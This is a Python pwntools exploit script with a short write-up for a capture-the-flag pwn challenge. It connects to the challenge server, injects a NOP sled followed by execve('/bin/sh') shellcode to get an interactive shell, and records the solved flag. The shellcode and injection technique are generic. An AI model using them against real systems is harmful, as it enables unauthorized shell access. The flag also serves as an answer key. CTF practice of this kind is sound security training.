#!/usr/bin/env python3

from pwn import *

################################# Write-Up #####################################
# Points: 200 (4 days in)
# Category: pwn
# Prompt: Level up your spellcoding! No source code this time.
# nc pwn.red.csaw.io 5009
#
# Frustrating to realize how easy this chall was. At first I thought I had to
# make new asm commands to move around 5 measly bytes in the second buffer of
# shellcode, but all I had to do was make a NOP sled to move from the first
# buffer to the other. SMH.
################################################################################

exe = ELF("level_2_spellcode")

context.binary = exe
context.log_level = 'debug'

def conn():
	if False:
		return process([exe.path])
	else:
		return remote("pwn.red.csaw.io", 5009)

def main():
	r = conn()
	#gdb.attach(r, '''b *0x08048954''')
	r.recvuntil(">")
	r.sendline("3")
	r.recvuntil("> ")
	#shellcode = "\xff`\x11" # Jump across junk to other part
	shellcode = "\x90"*12
	shellcode += "a"*5 # Junk that wil inevitably be overrun
	shellcode += "\x00" # Extra byte to complete add BYTE PTR [eax],al instruction; there are two more from the \x00 bytes that go over the junk
	#print(asm('jmp [eax+0x11]')) # used to copy and paste asm code to this script :)
	#shellcode += "(\x00"*3 # To negate all the add instructions mentioned just above
	shellcode += "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" # Second part of shellcode from Shellstorm
	r.sendline(shellcode)
	r.interactive()


if __name__ == "__main__":
	main()

# Shellcode found at: http://shell-storm.org/shellcode/files/shellcode-517.php
# Flag: flag{n1c3_h4nd-cr4f73d_sp3llc0d3}
# Solved by: Ryan Nguyen
